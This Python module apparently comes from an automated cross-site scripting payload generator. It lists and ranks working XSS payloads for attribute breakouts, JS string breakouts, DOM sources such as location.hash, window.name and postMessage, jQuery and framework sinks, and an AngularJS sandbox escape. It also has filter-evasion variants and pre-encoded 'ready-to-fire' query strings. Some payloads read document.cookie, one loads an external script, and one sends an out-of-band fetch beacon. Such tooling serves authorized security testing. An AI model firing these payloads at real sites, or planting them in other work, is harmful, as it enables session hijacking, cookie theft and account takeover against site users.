from __future__ import annotations

from dataclasses import replace
from urllib.parse import quote as url_quote

from ai_xss_generator.encodings import encode as chain_encode, url_safe as chain_url_safe
from ai_xss_generator.types import ParsedContext, PayloadCandidate


BASE_PAYLOADS: list[PayloadCandidate] = [
    PayloadCandidate(
        payload="\"><svg/onload=alert(document.domain)>",
        title="SVG onload break-out",
        explanation="Breaks out of an HTML attribute and pivots to an auto-firing SVG handler.",
        test_vector="Inject into reflected attribute or query parameter rendered into HTML.",
        tags=["polyglot", "attribute-breakout", "auto-trigger"],
    ),
    PayloadCandidate(
        payload="<img src=x onerror=alert(1)>",
        title="Classic image error",
        explanation="Useful against raw HTML insertion via innerHTML or template rendering.",
        test_vector="Send through fields reflected into DOM sink or server-side template.",
        tags=["dom", "html", "onerror"],
    ),
    PayloadCandidate(
        payload="<svg><script>alert(1)</script>",
        title="SVG script block",
        explanation="Works against sinks that preserve SVG or XML-ish fragments.",
        test_vector="Try in rich text or unsafely sanitized SVG upload/preview flows.",
        tags=["svg", "script-tag", "polyglot"],
    ),
    PayloadCandidate(
        payload="javascript:alert(document.cookie)",
        title="Protocol handler URI",
        explanation="Targets href/src assignments or framework bindings writing dangerous URLs.",
        test_vector="Inject into link inputs, router params, or href property sinks.",
        tags=["uri", "protocol", "href"],
    ),
    PayloadCandidate(
        payload="';alert(String.fromCharCode(88,83,83))//",
        title="Single-quote JS break-out",
        explanation="Escapes string literals that land in eval, setTimeout, or inline handlers.",
        test_vector="Use in query fragments or form inputs copied into JS strings.",
        tags=["js-context", "quote-breakout", "eval"],
    ),
    PayloadCandidate(
        payload="</script><script>alert(1)</script>",
        title="Script tag close-and-reopen",
        explanation="Closes an existing script context and starts a fresh executable block.",
        test_vector="Try where user content is embedded directly in a script tag.",
        tags=["script-context", "close-tag", "dom"],
    ),
    PayloadCandidate(
        payload="&#x3c;img src=x onerror=alert(1)&#x3e;",
        title="HTML-encoded image error",
        explanation="Bypasses weak filters that decode entities before inserting into HTML.",
        test_vector="Useful when input is entity-encoded once before rendering.",
        tags=["encoding", "html-entity", "evasion"],
    ),
    PayloadCandidate(
        payload="<details open ontoggle=alert(1)>",
        title="Details toggle auto-fire",
        explanation="Triggers without click in some rendering paths once the element is opened.",
        test_vector="Use where tag allowlists keep uncommon interactive elements.",
        tags=["html", "event", "evasion"],
    ),
    PayloadCandidate(
        payload="<math><mtext><img src=x onerror=alert(1)>",
        title="MathML wrapper",
        explanation="Targets sanitizers that overlook MathML namespaced content.",
        test_vector="Test on rich HTML sinks with partial allowlists.",
        tags=["mathml", "polyglot", "evasion"],
    ),
    PayloadCandidate(
        payload="Set.constructor`alert\\x281\\x29`()",
        title="Template literal constructor gadget",
        explanation="A no-parentheses variant for JS execution in template-literal-friendly sinks.",
        test_vector="Try in script expressions or framework expression injections.",
        tags=["constructor", "template-literal", "evasion"],
    ),
    PayloadCandidate(
        payload="jaVasCript:alert(1)",
        title="Case-variant javascript URI",
        explanation="Bypasses naive lowercase-only deny checks on protocol handlers.",
        test_vector="Inject into href or router-link style bindings.",
        tags=["uri", "case-variant", "evasion"],
    ),
    PayloadCandidate(
        payload="\\u003cimg src=x onerror=alert(1)\\u003e",
        title="Unicode escaped HTML",
        explanation="Useful when a JS string is later decoded and assigned into innerHTML.",
        test_vector="Send into JSON/JS contexts that later hydrate DOM.",
        tags=["unicode", "js-string", "dom"],
    ),
    PayloadCandidate(
        payload="[]['filter']['constructor']('alert(1)')()",
        title="Constructor chain gadget",
        explanation="Useful when `eval` is filtered but Function constructor gadgets are reachable.",
        test_vector="Target client-side JS expressions or template engines.",
        tags=["constructor", "jsfuck-ish", "eval-bypass"],
    ),
    PayloadCandidate(
        payload="<iframe srcdoc='<script>alert(1)</script>'>",
        title="srcdoc iframe",
        explanation="Triggers where arbitrary HTML is allowed but direct script tags are filtered.",
        test_vector="Try in innerHTML sinks with relaxed tag stripping.",
        tags=["iframe", "srcdoc", "html"],
    ),
    PayloadCandidate(
        payload="--><img src=x onerror=alert(1)>",
        title="Comment break-out",
        explanation="Useful when attacker input lands inside an HTML comment before rendering.",
        test_vector="Try against debug comments and hidden template fragments.",
        tags=["comment-breakout", "html", "onerror"],
    ),
    PayloadCandidate(
        payload="<a autofocus onfocus=alert(1) tabindex=1>x</a>",
        title="Autofocus anchor",
        explanation="Useful when interaction is limited but autofocus is preserved.",
        test_vector="Inject into HTML fragments inserted on page load.",
        tags=["autofocus", "focus", "event"],
    ),
    PayloadCandidate(
        payload="${alert(1)}",
        title="Template expression probe",
        explanation="Targets client-side template injections in Vue, AngularJS, and similar stacks.",
        test_vector="Inject into interpolation slots or template-bound attributes.",
        tags=["template-injection", "framework", "expression"],
    ),
    PayloadCandidate(
        payload="';top['al'+'ert'](1);//",
        title="Concatenated alert call",
        explanation="Avoids exact keyword matching inside JS string break-outs.",
        test_vector="Try where alert/eval are blocked by simplistic regex filters.",
        tags=["js-context", "concat", "evasion"],
    ),
    PayloadCandidate(
        payload="</title><svg/onload=alert(1)>",
        title="Title tag escape",
        explanation="Useful when user input lands inside title or metadata tags.",
        test_vector="Inject into search pages or dynamic titles.",
        tags=["metadata", "svg", "close-tag"],
    ),
    PayloadCandidate(
        payload="<form><button formaction=javascript:alert(1)>go</button></form>",
        title="Form action protocol gadget",
        explanation="Targets environments that validate anchors but not form actions.",
        test_vector="Try in form builders or HTML editors.",
        tags=["form", "protocol", "html"],
    ),
    PayloadCandidate(
        payload="x' onmouseover='alert(1)' x='",
        title="Inline handler splice",
        explanation="Breaks into existing attributes and inserts a new event handler.",
        test_vector="Inject into quoted attribute values and hover-enabled widgets.",
        tags=["attribute-breakout", "event-handler", "quoted"],
    ),
    PayloadCandidate(
        payload="';document.body.innerHTML='<img src=x onerror=alert(1)>'//",
        title="Script-to-DOM chain",
        explanation="Turns a JS string breakout into a secondary innerHTML sink for persistence.",
        test_vector="Best against data copied into setTimeout/eval or inline script blocks.",
        tags=["chain", "innerHTML", "js-context"],
    ),
    PayloadCandidate(
        payload='"><script src=//example.invalid/xss.js></script>',
        title="External script include probe",
        explanation="Useful for controlled callbacks during manual testing if CSP is weak.",
        test_vector="Only use against authorized targets with controlled listener infra.",
        tags=["external-script", "callback", "probe"],
    ),
    PayloadCandidate(
        payload="<object data='data:text/html,<script>alert(1)</script>'></object>",
        title="Data URI object embed",
        explanation="Can survive filters that only inspect outer tags.",
        test_vector="Try in HTML preview widgets that allow embedded objects.",
        tags=["data-uri", "object", "html"],
    ),
]


def _framework_payloads(context: ParsedContext) -> list[PayloadCandidate]:
    payloads: list[PayloadCandidate] = []
    frameworks = {framework.lower() for framework in context.frameworks}
    if "react" in frameworks:
        payloads.append(
            PayloadCandidate(
                payload='{"__html":"<img src=x onerror=alert(1)>"}',
                title="React dangerouslySetInnerHTML probe",
                explanation="Targets components that pass attacker-controlled content into `dangerouslySetInnerHTML`.",
                test_vector="Inject into props or JSON blobs feeding rich preview components.",
                tags=["react", "dangerouslySetInnerHTML", "dom"],
                framework_hint="React",
                target_sink="dangerouslySetInnerHTML",
            )
        )
    if "vue" in frameworks:
        payloads.append(
            PayloadCandidate(
                payload='{{constructor.constructor("alert(1)")()}}',
                title="Vue expression gadget",
                explanation="Probes template-expression injection in older Vue or unsafe compiler flows.",
                test_vector="Inject into user-controlled template fragments or runtime-compiled components.",
                tags=["vue", "expression", "constructor"],
                framework_hint="Vue",
            )
        )
    if "angular" in frameworks or "angularjs" in frameworks:
        payloads.append(
            PayloadCandidate(
                payload="{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}",
                title="AngularJS sandbox escape probe",
                explanation="Targets legacy AngularJS expression contexts with weak sandboxing.",
                test_vector="Use only if interpolation lands inside AngularJS templates.",
                tags=["angularjs", "sandbox-escape", "expression"],
                framework_hint="AngularJS",
            )
        )
    return payloads


def _sink_payloads(context: ParsedContext) -> list[PayloadCandidate]:
    payloads: list[PayloadCandidate] = []
    sink_names = {sink.sink.lower() for sink in context.dom_sinks}
    if "innerhtml" in sink_names:
        payloads.append(
            PayloadCandidate(
                payload="<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
                title="innerHTML SVG animate",
                explanation="Useful where innerHTML accepts SVG but strips plain script blocks.",
                test_vector="Inject into DOM content assignments or HTML preview widgets.",
                tags=["innerHTML", "svg", "animate"],
                target_sink="innerHTML",
            )
        )
    if "eval" in sink_names:
        payloads.append(
            PayloadCandidate(
                payload="');Function('alert(1)')();//",
                title="Eval-to-Function chain",
                explanation="Escapes a string passed to eval and falls into a secondary execution primitive.",
                test_vector="Use in query or hash data copied into eval-based routers.",
                tags=["eval", "function-constructor", "js-context"],
                target_sink="eval",
            )
        )
    if "settimeout" in sink_names or "setinterval" in sink_names:
        payloads.append(
            PayloadCandidate(
                payload="alert?.(1)//",
                title="Timer string execution probe",
                explanation="Small payload for timer callbacks passed as strings.",
                test_vector="Try where input is concatenated into setTimeout or setInterval.",
                tags=["timer", "js-context", "short"],
                target_sink="setTimeout",
            )
        )
    return payloads


def _location_href_payloads(context: ParsedContext) -> list[PayloadCandidate]:
    """Payloads for location.href / navigation sinks."""
    sink_names = {s.sink.lower() for s in context.dom_sinks}
    if not any(s in sink_names for s in ("location.href", "location.assign", "location.replace")):
        return []
    return [
        PayloadCandidate(
            payload="javascript:alert(document.domain)",
            title="JavaScript URI — navigation sink",
            explanation="Directly exploits location.href/assign/replace when attacker controls the URL value.",
            test_vector="Set the href/src/action value to this URI or inject into the parameter that feeds it.",
            tags=["uri", "javascript-url", "navigation-sink"],
            target_sink="location.href",
            risk_score=88,
        ),
        PayloadCandidate(
            payload="javascript:void(0);alert(document.cookie)",
            title="JavaScript URI — void bypass",
            explanation="void(0) satisfies naive non-empty checks before executing the payload.",
            test_vector="Use where pure javascript: is blocked but void() variant is not.",
            tags=["uri", "javascript-url", "void-bypass"],
            target_sink="location.href",
            risk_score=82,
        ),
        PayloadCandidate(
            payload="data:text/html,<script>alert(document.domain)</script>",
            title="Data URI HTML embed",
            explanation="data: URIs execute as a separate origin — useful where javascript: is stripped.",
            test_vector="Inject into src/href/data attributes or navigation sinks.",
            tags=["uri", "data-uri", "navigation-sink"],
            target_sink="location.href",
            risk_score=78,
        ),
    ]


def _dom_source_payloads(context: ParsedContext) -> list[PayloadCandidate]:
    """Payloads for DOM-based XSS sources (location.hash, window.name, etc.)."""
    sink_names = {s.sink for s in context.dom_sinks}
    dom_sources = [s for s in sink_names if s.startswith("dom_source:")]
    if not dom_sources:
        return []
    payloads: list[PayloadCandidate] = []
    # High-confidence DOM source+sink pairs get targeted payloads
    for sink in context.dom_sinks:
        if not sink.sink.startswith("dom_source:"):
            continue
        source_name = sink.sink[len("dom_source:"):]
        if source_name in ("location.hash", "location.search", "location.href", "document.URL"):
            payloads.append(PayloadCandidate(
                payload='"><img src=x onerror=alert(document.domain)>',
                title=f"DOM XSS via {source_name} → HTML sink",
                explanation=f"If {source_name} feeds an innerHTML/document.write sink, this payload executes on load.",
                test_vector=f"Append #\"><img src=x onerror=alert(1)> to the URL (or set the fragment).",
                tags=["dom-based", "hash", source_name, "innerHTML"],
                target_sink=sink.sink,
                risk_score=85 if sink.confidence >= 0.8 else 65,
            ))
            payloads.append(PayloadCandidate(
                payload="';alert(document.domain)//",
                title=f"DOM XSS via {source_name} → JS string sink",
                explanation=f"If {source_name} is interpolated into a JS string, this breaks out and executes.",
                test_vector=f"Append #';alert(1)// to the URL.",
                tags=["dom-based", "js-string-breakout", source_name],
                target_sink=sink.sink,
                risk_score=80 if sink.confidence >= 0.8 else 60,
            ))
        elif source_name == "window.name":
            payloads.append(PayloadCandidate(
                payload='<img src=x onerror=alert(document.domain)>',
                title="DOM XSS via window.name",
                explanation="Set window.name on a controlled page, then navigate to target — value persists across navigations.",
                test_vector="In an attacker page: window.name = '<img src=x onerror=alert(1)>'; window.location = TARGET_URL",
                tags=["dom-based", "window.name", "cross-navigation"],
                target_sink=sink.sink,
                risk_score=82 if sink.confidence >= 0.8 else 62,
            ))
        elif source_name == "postMessage":
            payloads.append(PayloadCandidate(
                payload='<img src=x onerror=alert(document.domain)>',
                title="DOM XSS via postMessage",
                explanation="postMessage handler passes attacker-controlled data to a sink without origin check.",
                test_vector="In an attacker page: window.open(TARGET_URL).postMessage('<img src=x onerror=alert(1)>', '*')",
                tags=["dom-based", "postMessage", "no-origin-check"],
                target_sink=sink.sink,
                risk_score=80 if sink.confidence >= 0.8 else 55,
            ))
    return payloads


def _jquery_payloads(context: ParsedContext) -> list[PayloadCandidate]:
    """Payloads for jQuery HTML injection sinks."""
    sink_names = {s.sink.lower() for s in context.dom_sinks}
    if not any("jquery" in s for s in sink_names):
        return []
    return [
        PayloadCandidate(
            payload="<img src=x onerror=alert(document.domain)>",
            title="jQuery HTML sink — img onerror",
            explanation="jQuery .html()/.append() etc. parse and insert raw HTML — no script tag needed.",
            test_vector="Inject through the parameter feeding the jQuery HTML sink.",
            tags=["jquery", "html-injection", "onerror"],
            target_sink="jQuery.html",
            risk_score=85,
        ),
        PayloadCandidate(
            payload="<svg><animate onbegin=alert(1) attributeName=x>",
            title="jQuery HTML sink — SVG animate",
            explanation="SVG animate fires without click, useful when script/img are filtered.",
            test_vector="Inject through the jQuery sink input.",
            tags=["jquery", "svg", "animate"],
            target_sink="jQuery.html",
            risk_score=80,
        ),
    ]


def _event_handler_reflection_payloads(context: ParsedContext) -> list[PayloadCandidate]:
    """Payloads for params reflected directly inside event handler attributes."""
    sink_names = {s.sink for s in context.dom_sinks}
    event_sinks = [s for s in sink_names if s.startswith("reflected_in_event_handler:")]
    if not event_sinks:
        return []
    payloads: list[PayloadCandidate] = []
    for sink_name in event_sinks:
        attr = sink_name.split(":")[-1]
        payloads.append(PayloadCandidate(
            payload="alert(document.domain)",
            title=f"Direct event handler injection ({attr})",
            explanation=f"Parameter value is placed verbatim inside {attr}=\"...\". No breakout needed — payload executes as-is.",
            test_vector=f"Send `alert(document.domain)` as the parameter value; it lands in {attr}=\"alert(document.domain)\".",
            tags=["event-handler", "direct-injection", attr],
            target_sink=sink_name,
            risk_score=95,
        ))
        payloads.append(PayloadCandidate(
            payload="alert(document.cookie)",
            title=f"Cookie exfil via {attr}",
            explanation=f"Captures cookies via direct injection into {attr} handler.",
            test_vector=f"Send `alert(document.cookie)` as the parameter value.",
            tags=["event-handler", "cookie-exfil", attr],
            target_sink=sink_name,
            risk_score=92,
        ))
    return payloads


# JS string breakout payloads (raw, before encoding) — used by _encoded_delivery_payloads
_JS_STRING_BREAKOUTS: list[tuple[str, str]] = [
    ('";alert(document.domain)//', "Double-quote JS string breakout → alert"),
    ("';alert(document.domain)//", "Single-quote JS string breakout → alert"),
    ('";alert(document.cookie)//', "Double-quote breakout → cookie exfil"),
    ("';alert(document.cookie)//", "Single-quote breakout → cookie exfil"),
    ('"+alert(document.domain)+"', "In-string concatenation injection"),
    (
        '";fetch("//"+document.domain)//',
        "Double-quote breakout → out-of-band beacon",
    ),
]


def _encoded_delivery_payloads(context: ParsedContext) -> list[PayloadCandidate]:
    """For each js_string_via_* sink, produce pre-encoded, ready-to-fire payloads.

    The ``payload`` field contains the encoded value as it should appear in the URL.
    The ``test_vector`` shows the exact query parameter string to use.
    """
    payloads: list[PayloadCandidate] = []

    for sink in context.dom_sinks:
        if not sink.sink.startswith("js_string_via_"):
            continue
        chain = sink.sink[len("js_string_via_"):]
        # location format: script[N]:param:PARAMNAME
        loc_parts = sink.location.split(":")
        if len(loc_parts) < 3 or loc_parts[-2] != "param":
            continue
        param_name = loc_parts[-1]

        for raw_payload, title in _JS_STRING_BREAKOUTS:
            encoded = chain_encode(raw_payload, chain)
            if encoded is None:
                continue
            # url_percent / double_url_percent values are already URL-safe; don't re-encode
            if chain in ("url_percent", "double_url_percent", "html_entity"):
                param_value = encoded
            else:
                param_value = chain_url_safe(encoded)
            payloads.append(
                PayloadCandidate(
                    payload=encoded,
                    title=f"{title} [{chain}] (param: {param_name})",
                    explanation=(
                        f"Parameter '{param_name}' is decoded server-side via {chain} "
                        f"and reflected into a JS string. This payload is pre-encoded — "
                        f"send it as the value of '{param_name}' without further modification."
                    ),
                    test_vector=f"?{param_name}={param_value}",
                    tags=["js-string-breakout", chain, f"param:{param_name}", "pre-encoded"],
                    target_sink=sink.sink,
                    risk_score=88,
                )
            )

    return payloads


def _input_payloads(context: ParsedContext) -> list[PayloadCandidate]:
    payloads: list[PayloadCandidate] = []
    for input_field in context.inputs[:6]:
        descriptor = input_field.name or input_field.id_value or input_field.tag
        payloads.append(
            PayloadCandidate(
                payload=f"seed:{descriptor}:<svg/onload=alert(1)>",
                title=f"Field-specific probe for {descriptor}",
                explanation="Tracks reflection path per field while still carrying an executable payload.",
                test_vector=f"Submit through `{descriptor}` and observe reflected path or DOM mutation.",
                tags=["field-specific", "tracing", input_field.input_type or "input"],
            )
        )
    return payloads


def base_payloads_for_context(context: ParsedContext) -> list[PayloadCandidate]:
    payloads = list(BASE_PAYLOADS)
    payloads.extend(_framework_payloads(context))
    payloads.extend(_sink_payloads(context))
    payloads.extend(_location_href_payloads(context))
    payloads.extend(_dom_source_payloads(context))
    payloads.extend(_jquery_payloads(context))
    payloads.extend(_event_handler_reflection_payloads(context))
    payloads.extend(_encoded_delivery_payloads(context))
    payloads.extend(_input_payloads(context))
    return payloads


def score_payload(payload: PayloadCandidate, context: ParsedContext) -> int:
    score = 25
    text = payload.payload.lower()
    sink_names = {sink.sink.lower() for sink in context.dom_sinks}
    frameworks = {framework.lower() for framework in context.frameworks}
    handlers = {handler.lower() for handler in context.event_handlers}
    tags = set(payload.tags)
    target = (payload.target_sink or "").lower()

    # ── Generic HTML/DOM injection ────────────────────────────────────────────
    if any(k in text for k in ("innerhtml", "<img", "<svg", "<iframe", "<math", "<object")):
        score += 15

    # ── Target sink match ─────────────────────────────────────────────────────
    if target and any(target in s for s in sink_names):
        score += 25
    elif any(s in tags or s == target for s in sink_names):
        score += 20

    # ── Active probe confirmed sinks — highest confidence ────────────────────
    if "probe-confirmed" in tags and target and any(s.startswith(target[:15]) for s in sink_names):
        score += 30
    probe_sinks = {s for s in sink_names if s.startswith("probe:")}
    if probe_sinks and "probe-confirmed" in tags:
        score += 20

    # ── Pre-encoded delivery — highest reward when chain matches ──────────────
    if "pre-encoded" in tags:
        # Already scored via target_sink above; boost further if chain exactly matches
        matched_sink = next((s for s in sink_names if target and s.startswith(target[:20])), None)
        if matched_sink:
            score += 15

    # ── Code execution sinks ──────────────────────────────────────────────────
    if "eval" in sink_names and any(k in text for k in ("function(", "constructor", "alert?.(", "set.constructor")):
        score += 18
    if any(s in sink_names for s in ("settimeout", "setinterval")) and "timer" in tags:
        score += 12

    # ── Navigation / javascript-URL sinks ────────────────────────────────────
    if any(s in sink_names for s in ("location.href", "location.assign", "location.replace")):
        if "javascript:" in text or "data:" in text:
            score += 18
        if "uri" in tags or "javascript-url" in tags:
            score += 10

    # ── DOM source sinks ──────────────────────────────────────────────────────
    dom_src_sinks = {s for s in sink_names if s.startswith("dom_source:")}
    if dom_src_sinks and "dom-based" in tags:
        score += 15
    if dom_src_sinks and "hash" in tags:
        score += 10

    # ── jQuery sinks ──────────────────────────────────────────────────────────
    if any("jquery" in s for s in sink_names) and any(k in text for k in ("<img", "<svg", "<iframe")):
        score += 12

    # ── Reflected event handler ───────────────────────────────────────────────
    event_reflect = {s for s in sink_names if s.startswith("reflected_in_event_handler")}
    if event_reflect and "event-handler" in tags:
        score += 20

    # ── JS string breakout ────────────────────────────────────────────────────
    js_string_sinks = {s for s in sink_names if s.startswith("js_string_via_")}
    if js_string_sinks and "js-string-breakout" in tags:
        score += 18

    # ── Framework-specific ───────────────────────────────────────────────────
    if "react" in frameworks and "react" in (payload.framework_hint or "").lower():
        score += 18
    if "vue" in frameworks and "vue" in (payload.framework_hint or "").lower():
        score += 18
    if ("angular" in frameworks or "angularjs" in frameworks) and "angular" in (payload.framework_hint or "").lower():
        score += 18

    # ── Generic quality signals ───────────────────────────────────────────────
    if any(tag in tags for tag in ("polyglot", "chain", "evasion")):
        score += 10
    if any(handler.replace("on", "") in text for handler in handlers):
        score += 8
    if context.forms:
        score += min(10, len(context.forms) * 2)
    if "javascript:" in text:
        score += 8
    if "seed:" in text:
        score -= 5

    return max(1, min(score, 100))


def dedupe_payloads(payloads: list[PayloadCandidate]) -> list[PayloadCandidate]:
    unique: dict[str, PayloadCandidate] = {}
    for payload in payloads:
        existing = unique.get(payload.payload)
        if existing is None or payload.risk_score > existing.risk_score:
            unique[payload.payload] = payload
    return list(unique.values())


def rank_payloads(payloads: list[PayloadCandidate], context: ParsedContext) -> list[PayloadCandidate]:
    scored: list[PayloadCandidate] = []
    for payload in dedupe_payloads(payloads):
        scored.append(replace(payload, risk_score=score_payload(payload, context)))
    return sorted(scored, key=lambda item: (-item.risk_score, item.payload))
